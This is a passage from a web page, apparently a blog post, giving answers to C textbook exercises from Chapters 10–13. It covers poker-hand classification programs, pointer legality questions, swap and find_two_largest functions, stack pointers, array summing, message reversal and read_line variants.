0; i &lt; cards_read; i++)</span><br><span class="line">      if (hand[i][RANK] == rank &amp;&amp; hand[i][SUIT] == suit) {</span><br><span class="line">        printf("Duplicate card; ignored.\n");</span><br><span class="line">        duplicate_card = true;</span><br><span class="line">        break;</span><br><span class="line">      }</span><br><span class="line"> </span><br><span class="line">    if (!duplicate_card) {</span><br><span class="line">      hand[cards_read][RANK] = rank;</span><br><span class="line">      hand[cards_read][SUIT] = suit;</span><br><span class="line">      cards_read++;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * analyze_hand: Determines whether the hand contains a   *</span><br><span class="line"> *               straight, a flush, four-of-a-kind,       *</span><br><span class="line"> *               and/or three-of-a-kind; determines the   *</span><br><span class="line"> *               number of pairs; stores the results into *</span><br><span class="line"> *               the external variables straight, flush,  *</span><br><span class="line"> *               four, three, and pairs.                  *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void analyze_hand(void)</span><br><span class="line">{</span><br><span class="line">  int rank, suit, card, pass, run;</span><br><span class="line"> </span><br><span class="line">  straight = true;</span><br><span class="line">  flush = true;</span><br><span class="line">  four = false;</span><br><span class="line">  three = false;</span><br><span class="line">  pairs = 0;</span><br><span class="line"> </span><br><span class="line">  /* sort cards by rank */</span><br><span class="line">  for (pass = 1; pass &lt; NUM_CARDS; pass++)</span><br><span class="line">    for (card = 0; card &lt; NUM_CARDS - pass; card++) {</span><br><span class="line">      rank = hand[card][RANK];</span><br><span class="line">      suit = hand[card][SUIT];</span><br><span class="line">      if (hand[card+1][RANK] &lt; rank) {</span><br><span class="line">        hand[card][RANK] = hand[card+1][RANK];</span><br><span class="line">        hand[card][SUIT] = hand[card+1][SUIT];</span><br><span class="line">        hand[card+1][RANK] = rank;</span><br><span class="line">        hand[card+1][SUIT] = suit;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">  /* check for flush */</span><br><span class="line">  suit = hand[0][SUIT];</span><br><span class="line">  for (card = 1; card &lt; NUM_CARDS; card++)</span><br><span class="line">    if (hand[card][SUIT] != suit)</span><br><span class="line">      flush = false;</span><br><span class="line"> </span><br><span class="line">  /* check for straight */</span><br><span class="line">  for (card = 0; card &lt; NUM_CARDS - 1; card++)</span><br><span class="line">    if (hand[card][RANK] + 1 != hand[card+1][RANK])</span><br><span class="line">      straight = false;</span><br><span class="line"> </span><br><span class="line">  /* check for 4-of-a-kind, 3-of-a-kind, and pairs by</span><br><span class="line">     looking for "runs" of cards with identical ranks */</span><br><span class="line">  card = 0;</span><br><span class="line">  while (card &lt; NUM_CARDS) {</span><br><span class="line">    rank = hand[card][RANK];</span><br><span class="line">    run = 0;</span><br><span class="line">    do {</span><br><span class="line">      run++;</span><br><span class="line">      card++;</span><br><span class="line">    } while (card &lt; NUM_CARDS &amp;&amp; hand[card][RANK] == rank);</span><br><span class="line">    switch (run) {</span><br><span class="line">      case 2: pairs++;      break;</span><br><span class="line">      case 3: three = true; break;</span><br><span class="line">      case 4: four = true;  break;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * print_result: Prints the classification of the hand,   *</span><br><span class="line"> *               based on the values of the external      *</span><br><span class="line"> *               variables straight, flush, four, three,  *</span><br><span class="line"> *               and pairs.                               *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void print_result(void)</span><br><span class="line">{</span><br><span class="line">  if (straight &amp;&amp; flush) printf("Straight flush");</span><br><span class="line">  else if (four)         printf("Four of a kind");</span><br><span class="line">  else if (three &amp;&amp;</span><br><span class="line">           pairs == 1)   printf("Full house");</span><br><span class="line">  else if (flush)        printf("Flush");</span><br><span class="line">  else if (straight)     printf("Straight");</span><br><span class="line">  else if (three)        printf("Three of a kind");</span><br><span class="line">  else if (pairs == 2)   printf("Two pairs");</span><br><span class="line">  else if (pairs == 1)   printf("Pair");</span><br><span class="line">  else                   printf("High card");</span><br><span class="line"> </span><br><span class="line">  printf("\n\n");</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>5.</strong> [was #6] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdbool.h&gt;   /* C99 only */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"> </span><br><span class="line">#define NUM_RANKS 13</span><br><span class="line">#define NUM_SUITS 4</span><br><span class="line">#define NUM_CARDS 5</span><br><span class="line"> </span><br><span class="line">/* external variables */</span><br><span class="line">int num_in_rank[NUM_RANKS];</span><br><span class="line">int num_in_suit[NUM_SUITS];</span><br><span class="line">bool straight, flush, four, three;</span><br><span class="line">int pairs;   /* can be 0, 1, or 2 */</span><br><span class="line"> </span><br><span class="line">/* prototypes */</span><br><span class="line">void read_cards(void);</span><br><span class="line">void analyze_hand(void);</span><br><span class="line">void print_result(void);</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * main: Calls read_cards, analyze_hand, and print_result *</span><br><span class="line"> *       repeatedly.                                      *</span><br><span class="line"> **********************************************************/</span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  for (;;) {</span><br><span class="line">    read_cards();</span><br><span class="line">    analyze_hand();</span><br><span class="line">    print_result();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * read_cards: Reads the cards into the external          *</span><br><span class="line"> *             variables num_in_rank and num_in_suit;     *</span><br><span class="line"> *             checks for bad cards and duplicate cards.  *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void read_cards(void)</span><br><span class="line">{</span><br><span class="line">  bool card_exists[NUM_RANKS][NUM_SUITS];</span><br><span class="line">  char ch, rank_ch, suit_ch;</span><br><span class="line">  int rank, suit;</span><br><span class="line">  bool bad_card;</span><br><span class="line">  int cards_read = 0;</span><br><span class="line"> </span><br><span class="line">  for (rank = 0; rank &lt; NUM_RANKS; rank++) {</span><br><span class="line">    num_in_rank[rank] = 0;</span><br><span class="line">    for (suit = 0; suit &lt; NUM_SUITS; suit++)</span><br><span class="line">      card_exists[rank][suit] = false;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  for (suit = 0; suit &lt; NUM_SUITS; suit++)</span><br><span class="line">    num_in_suit[suit] = 0;</span><br><span class="line"> </span><br><span class="line">  while (cards_read &lt; NUM_CARDS) {</span><br><span class="line">    bad_card = false;</span><br><span class="line"> </span><br><span class="line">    printf("Enter a card: ");</span><br><span class="line"> </span><br><span class="line">    rank_ch = getchar();</span><br><span class="line">    switch (rank_ch) {</span><br><span class="line">      case '0':           exit(EXIT_SUCCESS);</span><br><span class="line">      case '2':           rank = 0; break;</span><br><span class="line">      case '3':           rank = 1; break;</span><br><span class="line">      case '4':           rank = 2; break;</span><br><span class="line">      case '5':           rank = 3; break;</span><br><span class="line">      case '6':           rank = 4; break;</span><br><span class="line">      case '7':           rank = 5; break;</span><br><span class="line">      case '8':           rank = 6; break;</span><br><span class="line">      case '9':           rank = 7; break;</span><br><span class="line">      case 't': case 'T': rank = 8; break;</span><br><span class="line">      case 'j': case 'J': rank = 9; break;</span><br><span class="line">      case 'q': case 'Q': rank = 10; break;</span><br><span class="line">      case 'k': case 'K': rank = 11; break;</span><br><span class="line">      case 'a': case 'A': rank = 12; break;</span><br><span class="line">      default:            bad_card = true;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    suit_ch = getchar();</span><br><span class="line">    switch (suit_ch) {</span><br><span class="line">      case 'c': case 'C': suit = 0; break;</span><br><span class="line">      case 'd': case 'D': suit = 1; break;</span><br><span class="line">      case 'h': case 'H': suit = 2; break;</span><br><span class="line">      case 's': case 'S': suit = 3; break;</span><br><span class="line">      default:            bad_card = true;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    while ((ch = getchar()) != '\n')</span><br><span class="line">      if (ch != ' ') bad_card = true;</span><br><span class="line"> </span><br><span class="line">    if (bad_card)</span><br><span class="line">      printf("Bad card; ignored.\n");</span><br><span class="line">    else if (card_exists[rank][suit])</span><br><span class="line">      printf("Duplicate card; ignored.\n");</span><br><span class="line">    else {</span><br><span class="line">      num_in_rank[rank]++;</span><br><span class="line">      num_in_suit[suit]++;</span><br><span class="line">      card_exists[rank][suit] = true;</span><br><span class="line">      cards_read++;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * analyze_hand: Determines whether the hand contains a   *</span><br><span class="line"> *               straight, a flush, four-of-a-kind,       *</span><br><span class="line"> *               and/or three-of-a-kind; determines the   *</span><br><span class="line"> *               number of pairs; stores the results into *</span><br><span class="line"> *               the external variables straight, flush,  *</span><br><span class="line"> *               four, three, and pairs.                  *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void analyze_hand(void)</span><br><span class="line">{</span><br><span class="line">  int num_consec = 0;</span><br><span class="line">  int rank, suit;</span><br><span class="line"> </span><br><span class="line">  straight = false;</span><br><span class="line">  flush = false;</span><br><span class="line">  four = false;</span><br><span class="line">  three = false;</span><br><span class="line">  pairs = 0;</span><br><span class="line"> </span><br><span class="line">  /* check for flush */</span><br><span class="line">  for (suit = 0; suit &lt; NUM_SUITS; suit++)</span><br><span class="line">    if (num_in_suit[suit] == NUM_CARDS)</span><br><span class="line">      flush = true;</span><br><span class="line"> </span><br><span class="line">  /* check for straight */</span><br><span class="line">  rank = 0;</span><br><span class="line">  while (num_in_rank[rank] == 0) rank++;</span><br><span class="line">  for (; rank &lt; NUM_RANKS &amp;&amp; num_in_rank[rank] &gt; 0; rank++)</span><br><span class="line">    num_consec++;</span><br><span class="line">  if (num_consec == NUM_CARDS) {</span><br><span class="line">    straight = true;</span><br><span class="line">    return;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  /* check for ace-low straight */</span><br><span class="line">  if (num_consec == NUM_CARDS - 1 &amp;&amp;</span><br><span class="line">      num_in_rank[0] &gt; 0 &amp;&amp; num_in_rank[NUM_RANKS-1] &gt; 0) {</span><br><span class="line">    straight = true;</span><br><span class="line">    return;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  /* check for 4-of-a-kind, 3-of-a-kind, and pairs */</span><br><span class="line">  for (rank = 0; rank &lt; NUM_RANKS; rank++) {</span><br><span class="line">    if (num_in_rank[rank] == 4) four = true;</span><br><span class="line">    if (num_in_rank[rank] == 3) three = true;</span><br><span class="line">    if (num_in_rank[rank] == 2) pairs++;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * print_result: Prints the classification of the hand,   *</span><br><span class="line"> *               based on the values of the external      *</span><br><span class="line"> *               variables straight, flush, four, three,  *</span><br><span class="line"> *               and pairs.                               *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void print_result(void)</span><br><span class="line">{</span><br><span class="line">  if (straight &amp;&amp; flush) printf("Straight flush");</span><br><span class="line">  else if (four)         printf("Four of a kind");</span><br><span class="line">  else if (three &amp;&amp;</span><br><span class="line">           pairs == 1)   printf("Full house");</span><br><span class="line">  else if (flush)        printf("Flush");</span><br><span class="line">  else if (straight)     printf("Straight");</span><br><span class="line">  else if (three)        printf("Three of a kind");</span><br><span class="line">  else if (pairs == 2)   printf("Two pairs");</span><br><span class="line">  else if (pairs == 1)   printf("Pair");</span><br><span class="line">  else                   printf("High card");</span><br><span class="line"> </span><br><span class="line">  printf("\n\n");</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-11"><a href="#Chapter-11" class="headerlink" title="Chapter 11"></a>Chapter 11</h3><h4 id="Answers-to-Selected-Exercises-6"><a href="#Answers-to-Selected-Exercises-6" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2] (e), (f), and (i) are legal. (a) is illegal because <code>p</code> is a pointer to an integer and <code>i</code> is an integer. (b) is illegal because <code>*p</code> is an integer and <code>&amp;i</code> is a pointer to an integer. (c) is illegal because <code>&amp;p</code> is a pointer to a pointer to an integer and <code>q</code> is a pointer to an integer. (d) is illegal for reasons similar to (c). (g) is illegal because <code>p</code> is a pointer to an integer and <code>*q</code> is an integer. (h) is illegal because <code>*p</code> is an integer and <code>q</code> is a pointer to an integer. </p><p><strong>4.</strong> [was #4; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void swap(int *p, int *q)</span><br><span class="line">{</span><br><span class="line">  int temp;</span><br><span class="line"> </span><br><span class="line">  temp = *p;</span><br><span class="line">  *p = *q;</span><br><span class="line">  *q = temp;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>6.</strong> [was #6] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">void find_two_largest(int a[], int n, int *largest,</span><br><span class="line">                      int *second_largest)</span><br><span class="line">{</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  if (a[0] &gt; a[1]) {</span><br><span class="line">    *largest = a[0];</span><br><span class="line">    *second_largest = a[1];</span><br><span class="line">  } else {</span><br><span class="line">    *largest = a[1];</span><br><span class="line">    *second_largest = a[0];</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  for (i = 2; i &lt; n; i++)</span><br><span class="line">    if (a[i] &gt; *largest) {</span><br><span class="line">      *second_largest = *largest;</span><br><span class="line">      *largest = a[i];</span><br><span class="line">    } else if (a[i] &gt; *second_largest)</span><br><span class="line">      *second_largest = a[i];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-12"><a href="#Chapter-12" class="headerlink" title="Chapter 12"></a>Chapter 12</h3><h4 id="Answers-to-Selected-Exercises-7"><a href="#Answers-to-Selected-Exercises-7" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2] The statement is illegal because pointers cannot be added. Here’s a legal statement that has the desired effect: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">middle = low + (high - low) / 2;</span><br></pre></td></tr></tbody></table></figure><p>The value of <code>(high</code> <code>-</code> <code>low)</code> <code>/</code> <code>2</code> is an integer, not a pointer, so it can legally be added to <code>low</code>. </p><p><strong>4.</strong> [was #6] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int *top_ptr;</span><br><span class="line"> </span><br><span class="line">void make_empty(void)</span><br><span class="line">{</span><br><span class="line">  top_ptr = &amp;contents[0];</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">bool is_empty(void)</span><br><span class="line">{</span><br><span class="line">  return top_ptr == &amp;contents[0];</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">bool is_full(void)</span><br><span class="line">{</span><br><span class="line">  return top_ptr == &amp;contents[STACK_SIZE];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>6.</strong> [was #10; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int sum_array(const int a[], int n)</span><br><span class="line">{</span><br><span class="line">  int *p, sum;</span><br><span class="line"> </span><br><span class="line">  sum = 0;</span><br><span class="line">  for (p = a; p &lt; a + n; p++)</span><br><span class="line">    sum += *p;</span><br><span class="line">  return sum;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>13.</strong> [was #12; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#define N 10</span><br><span class="line"> </span><br><span class="line">double ident[N][N], *p;</span><br><span class="line">int num_zeros = N;</span><br><span class="line"> </span><br><span class="line">for (p = &amp;ident[0][0]; p &lt;= &amp;ident[N-1][N-1]; p++)</span><br><span class="line">  if (num_zeros == N) {</span><br><span class="line">    *p = 1.0;</span><br><span class="line">    num_zeros = 0;</span><br><span class="line">  } else {</span><br><span class="line">    *p = 0.0;</span><br><span class="line">    num_zeros++;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p><strong>15.</strong> [was #14] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int *p;</span><br><span class="line"> </span><br><span class="line">for (p = temperatures[i]; p &lt; temperatures[i] + 24; p++)</span><br><span class="line">  printf("%d ", *p);</span><br></pre></td></tr></tbody></table></figure><h4 id="Answers-to-Selected-Programming-Projects-5"><a href="#Answers-to-Selected-Programming-Projects-5" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>1.</strong> [was #4] </p><p>(a)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">#define MSG_LEN 80     /* maximum length of message */</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  char msg[MSG_LEN];</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  printf("Enter a message: ");</span><br><span class="line">  for (i = 0; i &lt; MSG_LEN; i++) {</span><br><span class="line">    msg[i] = getchar();</span><br><span class="line">    if (msg[i] == '\n')</span><br><span class="line">      break;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  printf("Reversal is: ");</span><br><span class="line">  for (i--; i &gt;= 0; i--)</span><br><span class="line">    putchar(msg[i]);</span><br><span class="line">  putchar('\n');</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(b)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">#define MSG_LEN 80     /* maximum length of message */</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  char msg[MSG_LEN], *p;</span><br><span class="line"> </span><br><span class="line">  printf("Enter a message: ");</span><br><span class="line">  for (p = &amp;msg[0]; p &lt; &amp;msg[MSG_LEN]; p++) {</span><br><span class="line">    *p = getchar();</span><br><span class="line">    if (*p == '\n')</span><br><span class="line">      break;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  printf("Reversal is: ");</span><br><span class="line">  for (p--; p &gt;= &amp;msg[0]; p--)</span><br><span class="line">    putchar(*p);</span><br><span class="line">  putchar('\n');</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>3.</strong> [was #8] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">#define MSG_LEN 80     /* maximum length of message */</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  char msg[MSG_LEN], *p;</span><br><span class="line"> </span><br><span class="line">  printf("Enter a message: ");</span><br><span class="line">  for (p = msg; p &lt; msg + MSG_LEN; p++) {</span><br><span class="line">    *p = getchar();</span><br><span class="line">    if (*p == '\n')</span><br><span class="line">      break;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  printf("Reversal is: ");</span><br><span class="line">  for (p--; p &gt;= msg; p--)</span><br><span class="line">    putchar(*p);</span><br><span class="line">  putchar('\n');</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-13"><a href="#Chapter-13" class="headerlink" title="Chapter 13"></a>Chapter 13</h3><h4 id="Answers-to-Selected-Exercises-8"><a href="#Answers-to-Selected-Exercises-8" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2] </p><p>(a) Illegal; <code>p</code> is not a character.<br> (b) Legal; output is <code>a</code>.<br> (c) Legal; output is <code>abc</code>.<br> (d) Illegal; <code>*p</code> is not a pointer. </p><p><strong>4.</strong> [was #4] </p><p>(a)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int read_line(char str[], int n)</span><br><span class="line">{</span><br><span class="line">  int ch, i = 0;</span><br><span class="line"> </span><br><span class="line">  while ((ch = getchar()) != '\n')</span><br><span class="line">    if (i == 0 &amp;&amp; isspace(ch))</span><br><span class="line">      ;   /* ignore */</span><br><span class="line">    else if (i &lt; n)</span><br><span class="line">      str[i++] = ch;</span><br><span class="line">  str[i] = '\0';</span><br><span class="line">  return i;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(b)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int read_line(char str[], int n)</span><br><span class="line">{</span><br><span class="line">  int ch, i = 0;</span><br><span class="line"> </span><br><span class="line">  while (!isspace(ch = getchar()))</span><br><span class="line">    if (i &lt; n)</span><br><span class="line">      str[i++] = ch;</span><br><span class="line">  str[i] = '\0';</span><br><span class="line">  return i;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(c)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int read_line(char str[], int n)</span><br><span class="line">{</span><br><span class="line">  int ch, i = 0;</span><br><span class="line"> </span><br><span class="line">  do {</span><br><span class="line">    ch = getchar();</span><br><span class="line">    if (i &lt; n)</span><br><span class="line">      str[i++] = ch;</span><br><span class="line">  } while (ch != '\n');</span><br><span class="line">  str[i] = '\0';</span><br><span class="line">  return i;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(d)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 